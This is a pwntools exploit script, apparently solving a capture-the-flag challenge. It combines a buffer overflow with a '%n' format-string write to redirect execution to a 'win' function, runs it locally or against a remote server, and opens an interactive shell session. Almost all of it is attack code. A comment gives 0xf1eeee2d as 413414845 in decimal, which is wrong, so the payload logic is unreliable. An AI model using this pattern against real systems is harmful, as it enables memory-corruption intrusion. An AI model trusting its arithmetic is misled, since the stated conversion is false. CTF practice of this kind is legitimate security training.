from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB: # use the gdb script, sudo apt install gdbserver
        return gdb.debug([binPath], gdbscript=gdbscript, aslr=False)
    elif args.REMOTE: # ['server', 'port']
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return process([binPath])

# build in GDB support
gdbscript = '''
init-pwndbg
  b *vuln+53
  b *win+77
  c
'''.format(**locals())

binPath="./chall"

# Payload to write 0xf1eeee2d to state
overFlow = b"A" * 32  # Fill local_buf
state_addr = p64(0x0000000000404540)  # Address to write to
target = b"%413414845x%n"  # Write 0xf1eeee2d bytes (413414845 in decimal)
win_addr = p64(0x00000000004011d6) # Address of win

payload = flat(
        [
            overFlow,
            state_addr,
	    target,
	    win_addr
           ]
        )

# Send the payload
p = start()
p.sendline(payload)
p.interactive()